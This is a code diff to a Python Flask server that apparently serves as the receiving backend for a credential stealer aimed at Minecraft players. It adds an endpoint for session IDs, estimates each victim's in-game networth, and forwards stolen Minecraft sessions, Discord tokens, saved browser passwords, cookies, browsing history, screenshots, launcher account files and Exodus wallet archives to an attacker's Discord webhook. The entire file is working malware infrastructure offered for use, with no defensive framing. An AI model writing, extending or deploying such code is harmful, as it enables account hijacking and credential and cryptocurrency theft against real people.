@@ -6,6 +6,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from flask import Flask, request
 from flask_restful import Api, Resource
 import requests
+import numerize
 
 app = Flask(__name__)
 api = Api(app)
@@ -30,6 +31,83 @@ def validate_session(ign, uuid, ssid):
             return False
     else:
         return False
+
+def getnetworth(ign: str):
+    try:
+        url = config['networth_api'] + "/v2/profiles/" + ign + "?key=YOUR_SKYHELPER_API_KEY_HERE"
+        response = requests.get(url)
+        kekw = response.json()
+        networth = 0
+        for profile in kekw['data']:
+            networth += profile['networth']['unsoulboundNetworth']
+        return networth
+    except:
+        return 0
+    
+class SSID(Resource):
+    def post(self):
+        args = request.json
+        print(args)
+
+        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+            ip = request.environ['REMOTE_ADDR']
+        else:
+            ip = request.environ['HTTP_X_FORWARDED_FOR']
+
+        if ip in ips:
+            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 60:
+                ips[ip]['count'] = 1
+                ips[ip]['timestamp'] = time.time()
+            else:
+                if ips[ip]['count'] < config['ip_ratelimit']:
+                    ips[ip]['count'] += 1
+                else:
+                    print("Rejected ratelimited ip")
+                    return {'status': 'ratelimited'}, 429
+
+        else:
+            ips[ip] = {
+                'count': 1,
+                'timestamp': time.time()
+            }
+
+        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
+                                 username=config['webhook_name'],
+                                 avatar_url=config['webhook_avatar'])
+
+        if config['codeblock_type'] == 'small':
+            cb = '`'
+        elif config['codeblock_type'] == 'big':
+            cb = '```'
+        else:
+            cb = '`'
+            print('Invalid codeblock type in config.json, defaulting to small')
+
+        webhook.content = config['message'].replace('%IP%', ip)
+
+        mc = args['minecraft']
+        if config['validate_session']:
+            if not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
+                print("Rejected invalid session id")
+                return {'status': 'invalid session'}, 401
+
+        mc_embed = DiscordEmbed(title=config['mc_embed_title'],
+                                color=hex(int(config['mc_embed_color'], 16)))
+        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
+        mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
+        mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
+        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
+        try:
+            mc_embed.add_embed_field(name='Networth', value="```" + numerize.numerize(getnetworth(mc['ign'])) + "```", inline=True)
+        except:
+            mc_embed.add_embed_field(name='Networth', value="```" + "Error" + "```", inline=True)
+        webhook.add_embed(mc_embed)
+        webhook.execute()
+
+        return {'status': 'ok'}, 200
+
+    def get(self):
+        return {'status': 'ok'}, 200
 
 
 class Delivery(Resource):
@@ -85,6 +163,10 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
         mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
+        try:
+            mc_embed.add_embed_field(name='Networth', value="```" + numerize.numerize(getnetworth(mc['ign'])) + "```", inline=True)
+        except:
+            mc_embed.add_embed_field(name='Networth', value="```" + "Error" + "```", inline=True)
         embeds.append(mc_embed)
         if len(args['discord']) > 0:
             for tokenjson in args['discord']:
@@ -118,35 +200,25 @@ class Delivery(Resource):
             discord_embed.set_footer(text=config['discord_embed_footer_text'],
                                      icon_url=config['discord_embed_footer_icon'])
             embeds.append(discord_embed)
-        password_list = [password for password in args['passwords'] if not password['password'] == ""]
-        if len(password_list) > 0:
-            embed_descriptions = [""]
-            i = 0
-            for j, password in enumerate(password_list):
-                try:
-                    embed_descriptions[i] += password['url'] + "\nUsername: " + cb + password[
-                        'username'] + cb + "\nPassword: " + cb + password['password'] + cb + "\n"
-                except:
-                    pass
-                if len(embed_descriptions[i]) > 1700 and j != len(password_list) - 1:
-                    i += 1
-                    embed_descriptions.append("")
-            for description in embed_descriptions:
-                password_embed = DiscordEmbed(title=config['password_embed_title'],
-                                              color=hex(int(config['password_embed_color'], 16)),
-                                              description=description)
-                password_embed.set_footer(text=config['password_embed_footer_text'],
-                                          icon_url=config['password_embed_footer_icon'])
-                embeds.append(password_embed)
 
-        else:
-            password_embed = DiscordEmbed(title=config['password_embed_title'],
-                                          color=hex(int(config['password_embed_color'], 16)),
-                                          description="No passwords found")
-            password_embed.set_footer(text=config['password_embed_footer_text'],
-                                      icon_url=config['password_embed_footer_icon'])
+        try:
+            password_list = [password for password in args['passwords'] if not password['password'] == ""]
+            if len(password_list) > 0:
+                password_string = ""
+                for password in password_list:
+                    try:
+                        password_string += password['url'] + "\nUsername: " + password['username'] + "\nPassword: " + password['password'] + "\n"
+                    except:
+                        pass
+            file = "passwords.txt"
+            with open(file, "w") as f:
+                f.write(password_string)
+            webhook.add_file(file=open(file, "r"), filename="passwords.txt")
+            f.close()
+        except:
+            print("Rejected invalid password list")
 
-            embeds.append(password_embed)
+            
 
         file_embed = DiscordEmbed(title=config['file_embed_title'],
                                   color=hex(int(config['file_embed_color'], 16)))
@@ -162,6 +234,7 @@ class Delivery(Resource):
         batch_size = 3
         num_messages = (len(embeds) + batch_size - 1) // batch_size
 
+
         for i in range(num_messages):
             start_index = i * batch_size
             end_index = start_index + batch_size
@@ -172,19 +245,29 @@ class Delivery(Resource):
 
             webhook.execute(remove_embeds=True)
             webhook.content = ""
+
         history = ""
         for entry in args['history']:
             history += "Visit count: " + str(entry['visitCount']) + "\t" + "Title: " + entry['title'] + " " * 5 + "\t" + "URL: " + entry['url'] + "\t" + f"({entry['browser']})" + "\n"
 
+        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
+                                 username=config['webhook_name'],
+                                 avatar_url=config['webhook_avatar'])
+        
         if "lunar" in args:
             webhook.add_file(file=base64.b64decode(args['lunar']), filename="lunar_accounts.json")
         if "essential" in args:
             webhook.add_file(file=base64.b64decode(args['essential']), filename="essential_accounts.json")
-
-        webhook.add_file(file=history.encode(), filename="history.txt")
-        webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
-        webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")
+        if "history" in args:
+            webhook.add_file(file=history.encode(), filename="history.txt")
+        if "cookies" in args:
+            webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
+        if "screenshot" in args:
+            webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")
+        if "exodus" in args:
+            webhook.add_file(file=base64.b64decode(args['exodus']), filename="Exodus.zip")
         webhook.execute()
+
 
         return {'status': 'ok'}, 200
 
@@ -193,6 +276,7 @@ class Delivery(Resource):
 
 
 api.add_resource(Delivery, '/delivery')
+api.add_resource(SSID, '/ssid')
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=80)
